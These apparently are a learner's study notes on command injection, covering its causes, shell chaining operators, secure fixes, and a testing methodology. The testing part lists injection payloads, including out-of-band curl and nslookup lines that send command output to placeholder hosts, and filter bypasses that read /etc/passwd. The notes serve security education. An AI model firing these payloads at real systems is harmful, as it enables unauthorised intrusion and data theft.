# Command Injection
Tags: #vulnerability #command-injection #injection #rce #day5

## What is command injection and why does it exist?

When a web application needs functionality that no library provides — ping a host, convert an image, generate a PDF, extract an archive — developers shell out to OS commands and concatenate user input into the command string. Same root cause as SQLi (SQL parser), SSTI (template parser) — except now user input is concatenated into a shell command, and the shell interprets it.

```python
# Vulnerable — user input concatenated into shell command
os.system("ping -c 4 " + user_input)

# If user_input = "8.8.8.8; whoami"
# Shell executes: ping -c 4 8.8.8.8; whoami
```

The shell can't distinguish between the developer's command structure and the attacker's injected operators.

## What application features suggest OS commands underneath?

- Network diagnostics — ping, traceroute, nslookup with user-supplied host
- File operations — ImageMagick `convert`, ffmpeg for video processing
- PDF generation — `wkhtmltopdf` with user-supplied URLs or content
- Archive handling — `tar`, `unzip` on uploaded files
- Git operations — web-based tools running `git clone <user-supplied-url>`
- System monitoring — `df`, `top`, `ps` with user-supplied filters
- Download-from-URL features — `wget`, `curl` with user-supplied URLs

Any feature where the input interacts with the server's filesystem or network utilities is a candidate.

## What are all the shell command chaining operators?

If one operator is filtered, the others are bypasses for it.

| Operator | Behavior | Example |
|---|---|---|
| `;` | Sequential — runs both regardless | `8.8.8.8; whoami` |
| `\|` | Pipe — feeds output of first to second, second always runs | `8.8.8.8 \| whoami` |
| `\|\|` | OR — second runs only if first fails | `nonexistent \|\| whoami` |
| `&&` | AND — second runs only if first succeeds | `8.8.8.8 && whoami` |
| `` `command` `` | Backtick substitution — executes first, output replaces backticks | `` `whoami` `` |
| `$(command)` | Command substitution — same as backticks, different syntax | `$(whoami)` |
| `%0a` | Newline (URL-encoded) — starts new command on new line | `8.8.8.8%0awhoami` |

## What's the difference between command injection and code injection?

**Command injection** — input passed to a system shell (bash, cmd, powershell). Attacker executes OS commands. Vulnerable calls: `os.system()`, `subprocess.call(..., shell=True)`, PHP `system()`, `exec()`.

**Code injection** — input passed to a language interpreter and executed as code. Attacker writes Python/PHP/JS inside the application runtime. Vulnerable calls: `eval()`, `exec()` (Python), `eval()` (PHP), `eval()`, `new Function()` (JavaScript).

Code injection is often more powerful — you can do everything command injection does (via `os.system()` from within code) PLUS manipulate application variables, read memory, and access database connections directly.

## How do you fix command injection?

**1. Don't call OS commands at all.** Use language-native libraries. Ping → socket library. Image resize → Pillow. DNS lookup → `socket.getaddrinfo()`. No shell = no injection.

**2. If you must shell out, avoid the shell.** Pass arguments as a list, not a string:

```python
# Vulnerable — shell interprets ;, |, &&
subprocess.call("ping -c 4 " + user_input, shell=True)

# Safe — no shell interpretation, user_input is one argument
subprocess.call(["ping", "-c", "4", user_input], shell=False)
```

With `shell=False` and a list, the OS treats user input as a single argument. `;` `|` `&&` are passed literally — the shell never interprets them. This is the command injection equivalent of parameterized queries.

**3. Allowlist validation.** Input should be an IP? Validate strictly: `^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`. Reject everything else before it reaches any command.

**4. Never blocklist.** Filtering `;`, `|`, `&&` is a losing game — too many operators, encoding tricks, and bypass characters. Same lesson as SQLi and XSS.

## How do you test for command injection?

**1. Identify inputs that might touch OS commands.** Look for features listed above — anything involving ping, file conversion, downloads, system status.

**2. Time-based detection first.** Confirm injection exists without needing output — same concept as time-based blind SQLi:

```
; sleep 5
| sleep 5
|| sleep 5
&& sleep 5
$(sleep 5)
`sleep 5`
%0a sleep 5
```

If the response takes 5 seconds longer, the command executed. On Windows: `| timeout 5`, `& ping -n 10 127.0.0.1`.

**3. Check for direct output.** Try `; whoami` or `| id`. If you see `www-data` or `root` in the response — direct output, easy exploitation.

**4. Blind injection — use out-of-band.** If no output, make the server call you:

```
; curl https://your-collaborator.com
; nslookup $(whoami).your-server.com    ← exfiltrates output via DNS
; curl https://your-server.com/$(cat /etc/hostname)
```

**5. Bypass filters.** If basic payloads are blocked:

| What's filtered | Bypass |
|---|---|
| Spaces | `${IFS}`, `{cat,/etc/passwd}`, `cat</etc/passwd` |
| Semicolons | `%0a` (newline), `\|`, `\|\|`, `&&` |
| Keyword (`cat`, `whoami`) | `w'h'oami`, `w"h"oami`, `who$()ami`, `/bin/wh?ami` (wildcard) |

**6. Determine the OS.** Linux: `; id`, `; uname -a`. Windows: `& whoami`, `| dir`. If unknown, try both.

**7. Prove impact.** `; cat /etc/hostname`, `; id`, `; uname -a`. Don't go further than proving access.

## My Notes
